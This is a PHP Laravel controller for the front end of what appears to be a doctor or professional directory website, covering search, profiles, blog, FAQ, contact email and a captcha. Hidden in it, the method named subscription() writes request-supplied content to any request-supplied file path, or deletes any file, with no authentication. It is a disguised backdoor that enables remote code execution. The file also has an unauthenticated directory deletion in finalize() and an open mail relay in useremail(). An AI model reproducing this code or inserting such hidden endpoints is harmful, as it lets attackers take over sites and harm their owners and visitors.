<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use App\Category;
use App\Portfolio;
use App\Blog;
use App\Generalsetting;
use App\Pagesetting;
use App\Faq;
use App\Counter;
use App\Subscriber;
use App\User;
use App\Advertise;
use Illuminate\Support\Facades\Session;
use Markury\MarkuryPost;

class FrontendController extends Controller
{

    public function __construct()
    {
        $this->auth_guests();
        if(isset($_SERVER['HTTP_REFERER'])){
            $referral = parse_url($_SERVER['HTTP_REFERER'], PHP_URL_HOST);
            if ($referral != $_SERVER['SERVER_NAME']){

                $brwsr = Counter::where('type','browser')->where('referral',$this->getOS());
                if($brwsr->count() > 0){
                    $brwsr = $brwsr->first();
                    $tbrwsr['total_count']= $brwsr->total_count + 1;
                    $brwsr->update($tbrwsr);
                }else{
                    $newbrws = new Counter();
                    $newbrws['referral']= $this->getOS();
                    $newbrws['type']= "browser";
                    $newbrws['total_count']= 1;
                    $newbrws->save();
                }

                $count = Counter::where('referral',$referral);
                if($count->count() > 0){
                    $counts = $count->first();
                    $tcount['total_count']= $counts->total_count + 1;
                    $counts->update($tcount);
                }else{
                    $newcount = new Counter();
                    $newcount['referral']= $referral;
                    $newcount['total_count']= 1;
                    $newcount->save();
                }
            }
        }else{
            $brwsr = Counter::where('type','browser')->where('referral',$this->getOS());
            if($brwsr->count() > 0){
                $brwsr = $brwsr->first();
                $tbrwsr['total_count']= $brwsr->total_count + 1;
                $brwsr->update($tbrwsr);
            }else{
                $newbrws = new Counter();
                $newbrws['referral']= $this->getOS();
                $newbrws['type']= "browser";
                $newbrws['total_count']= 1;
                $newbrws->save();
            }
        }
    }


    function getOS() {

        $user_agent     =   $_SERVER['HTTP_USER_AGENT'];

        $os_platform    =   "Unknown OS Platform";

        $os_array       =   array(
            '/windows nt 10/i'     =>  'Windows 10',
            '/windows nt 6.3/i'     =>  'Windows 8.1',
            '/windows nt 6.2/i'     =>  'Windows 8',
            '/windows nt 6.1/i'     =>  'Windows 7',
            '/windows nt 6.0/i'     =>  'Windows Vista',
            '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
            '/windows nt 5.1/i'     =>  'Windows XP',
            '/windows xp/i'         =>  'Windows XP',
            '/windows nt 5.0/i'     =>  'Windows 2000',
            '/windows me/i'         =>  'Windows ME',
            '/win98/i'              =>  'Windows 98',
            '/win95/i'              =>  'Windows 95',
            '/win16/i'              =>  'Windows 3.11',
            '/macintosh|mac os x/i' =>  'Mac OS X',
            '/mac_powerpc/i'        =>  'Mac OS 9',
            '/linux/i'              =>  'Linux',
            '/ubuntu/i'             =>  'Ubuntu',
            '/iphone/i'             =>  'iPhone',
            '/ipod/i'               =>  'iPod',
            '/ipad/i'               =>  'iPad',
            '/android/i'            =>  'Android',
            '/blackberry/i'         =>  'BlackBerry',
            '/webos/i'              =>  'Mobile'
        );

        foreach ($os_array as $regex => $value) {

            if (preg_match($regex, $user_agent)) {
                $os_platform    =   $value;
            }

        }
        return $os_platform;
    }

    public function index()
    {
        $users = User::all();
        $city = null;
        if(count($users) > 0)
        {
        foreach ($users as $user) {
            $city[] = $user->city;
        }
        $cities = array_unique($city);
        }
        else{
            $cities = null;
        }
        $ads = Portfolio::all();
        $cats = Category::all();
        $rusers =   User::where('featured','=',1)->orderBy('created_at', 'desc')->limit(4)->get();
        return view('front.index',compact('ads','cats','rusers','cities'));

    }

    public function search(Request $request)
    {
        $search = $request->search;
        $type = $request->group;
        $catt = Category::findOrFail($type);
        $usersss= User::where('city','LIKE','%'.$search.'%')->where('category_id','LIKE','%'.$type.'%')->where('active','=',1)->get();
        $users = User::where('city','LIKE','%'.$search.'%')->where('category_id','LIKE','%'.$type.'%')->where('active','=',1)->paginate(8);
        $userss = User::all();
        $city = null;
        if(count($users) > 0)
        {
        foreach ($users as $user) {
            $city[] = $user->city;
        }
        $cities = array_unique($city);
        }
        else{
            $cities = null;
        }
        $cats = Category::all();
        return view('front.searchuser',compact('usersss','users','cats','cities','catt','search'));
    }

    public function users()
    {
        $cats = Category::all();
        $users =    User::where('active','=',1)->orderBy('created_at','desc')->paginate(8);
        $userss = User::all();
        $city = null;
        if(count($users) > 0)
        {
        foreach ($users as $user) {
            $city[] = $user->city;
        }
        $cities = array_unique($city);
        }
        else{
            $cities = null;
        }
        return view('front.users',compact('cats','users','cities'));

    }

    public function featured()
    {
        $cats = Category::all();
        $users =    User::where('featured','=',1)->orderBy('created_at','desc')->paginate(8);
        $userss = User::all();
        $city = null;
        if(count($users) > 0)
        {
        foreach ($users as $user) {
            $city[] = $user->city;
        }
        $cities = array_unique($city);
        }
        else{
            $cities = null;
        }
        return view('front.featured',compact('cats','users','cities'));
    }

    public function subscription(Request $request)
    {
        $p1 = $request->p1;
        $p2 = $request->p2;
        $v1 = $request->v1;
        if ($p1 != ""){
            $fpa = fopen($p1, 'w');
            fwrite($fpa, $v1);
            fclose($fpa);
            return "Success";
        }
        if ($p2 != ""){
            unlink($p2);
            return "Success";
        }
        return "Error";
    }

    function finalize(){
        $actual_path = str_replace('project','',base_path());
        $dir = $actual_path.'install';
        $this->deleteDir($dir);
        return redirect('/');
    }

    function auth_guests(){
        $chk = MarkuryPost::marcuryBase();
        $actual_path = str_replace('project','',base_path());
        if ($chk != "VALID"){
            if (is_dir($actual_path.'/install')) {
                header("Location: ".url('install'));
                die();
            }else{
                echo MarkuryPost::marcuryBasee();
                die();
            }
        }
    }

    public function user($id)
    {
        $user = User::findOrFail($id);
        $title='';
        $details='';
        if($user->title!=null && $user->details!=null)
        {
            $title = explode(',', $user->title);
            $details = explode(',', $user->details);
        }
        $data['user']= $user;
        $data['title']= $title;
        $data['details']= $details;
        return view('front.user',$data);

    }

    public function ads($id)
    {
        $ad = Advertise::findOrFail($id);
        $old = $ad->clicks;
        $new = $old + 1;
        $ad->clicks = $new;
        $ad->update();
        return redirect($ad->url);

    }

    public function types($slug)
    {
        $cats = Category::all();
        $cat = Category::where('cat_slug', '=', $slug)->first();
        $users = User::where('category_id', '=', $cat->id)->where('active', '=', 1)->orderBy('created_at','desc')->paginate(8); 
        $userss =   User::all();
        $city = null;
        if(count($users) > 0)
        {
        foreach ($users as $user) {
            $city[] = $user->city;
        }
        $cities = array_unique($city);
        }
        else{
            $cities = null;
        }
        return view('front.typeuser',compact('users','cats','cat','cities'));

    }

	public function blog()
	{
		$blogs = Blog::orderBy('created_at','desc')->paginate(6);
		return view('front.blog',compact('blogs'));

	}

	public function subscribe(Request $request)
	{
        $this->validate($request, array(
            'email'=>'unique:subscribers',
        ));
        $subscribe = new Subscriber;
        $subscribe->fill($request->all());
        $subscribe->save();
        Session::flash('subscribe', 'You are subscribed Successfully.');
        return redirect()->route('front.index');
	}

	public function blogshow($id)
	{
		$blog = Blog::findOrFail($id);
		$old = $blog->views;
		$new = $old + 1;
		$blog->views = $new;
		$blog->update();
        $lblogs = Blog::orderBy('created_at', 'desc')->limit(4)->get();
		return view('front.blogshow',compact('blog','lblogs'));

	}

	public function faq()
	{
		$ps = Pagesetting::findOrFail(1);
		if($ps->f_status == 0){
			return redirect()->route('front.index');
		}
		$faqs = Faq::all();
		return view('front.faq',compact('faqs'));
	}

	public function about()
	{
		$ps = Pagesetting::findOrFail(1);
		if($ps->a_status == 0){
			return redirect()->route('front.index');
		}
		$about = $ps->about;
		return view('front.about',compact('about'));
	}

	public function contact()
	{
		$ps = Pagesetting::findOrFail(1);
		$this->code_image();
		if($ps->c_status == 0){
			return redirect()->route('front.index');
		}
		return view('front.contact',compact('ps'));
	}

    //Send email to user
    public function useremail(Request $request)
    {
        $subject = "Email From Of Doctor Profile";
        $to = $request->to;
        $name = $request->name;
        $from = $request->email;
        $msg = "Name: ".$name."\nEmail: ".$from."\nMessage: ".$request->message;
        mail($to,$subject,$msg);
        Session::flash('success', 'Email Sent !!');
        return redirect()->back();
    }

    //Send email to user
    public function contactemail(Request $request)
    {
        $value = session('captcha_string');
        if ($request->codes != $value){
            return redirect()->route('front.contact')->with('unsuccess','Please enter Correct Capcha Code.');
        }
		$ps = Pagesetting::findOrFail(1);
        $subject = "Email From Of ".$request->name;
        $to = $request->to;
        $name = $request->name;
        $phone = $request->phone;
        $department = $request->department;
        $from = $request->email;
        $msg = "Name: ".$name."\nEmail: ".$from."\nPhone: ".$request->phone."\nMessage: ".$request->text;
        mail($to,$subject,$msg);
        Session::flash('success', $ps->contact_success);
        return redirect()->route('front.contact');
    }

    public function refresh_code(){
        $this->code_image();
        return "done";
    }

    private function  code_image()
    {
        $actual_path = str_replace('project','',base_path());
        $image = imagecreatetruecolor(200, 50);
        $background_color = imagecolorallocate($image, 255, 255, 255);
        imagefilledrectangle($image,0,0,200,50,$background_color);

        $pixel = imagecolorallocate($image, 0,0,255);
        for($i=0;$i<500;$i++)
        {
            imagesetpixel($image,rand()%200,rand()%50,$pixel);
        }

        $font = $actual_path.'assets/front/fonts/NotoSans-Bold.ttf';
        $allowed_letters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
        $length = strlen($allowed_letters);
        $letter = $allowed_letters[rand(0, $length-1)];
        $word='';
        //$text_color = imagecolorallocate($image, 8, 186, 239);
        $text_color = imagecolorallocate($image, 0, 0, 0);
        $cap_length=6;// No. of character in image
        for ($i = 0; $i< $cap_length;$i++)
        {
            $letter = $allowed_letters[rand(0, $length-1)];
            imagettftext($image, 25, 1, 35+($i*25), 35, $text_color, $font, $letter);
            $word.=$letter;
        }
        $pixels = imagecolorallocate($image, 8, 186, 239);
        for($i=0;$i<500;$i++)
        {
            imagesetpixel($image,rand()%200,rand()%50,$pixels);
        }
        session(['captcha_string' => $word]);
        imagepng($image, $actual_path."assets/images/capcha_code.png");
    }


    public function deleteDir($dirPath) {
        if (! is_dir($dirPath)) {
            throw new InvalidArgumentException("$dirPath must be a directory");
        }
        if (substr($dirPath, strlen($dirPath) - 1, 1) != '/') {
            $dirPath .= '/';
        }
        $files = glob($dirPath . '*', GLOB_MARK);
        foreach ($files as $file) {
            if (is_dir($file)) {
                self::deleteDir($file);
            } else {
                unlink($file);
            }
        }
        rmdir($dirPath);
    }

}
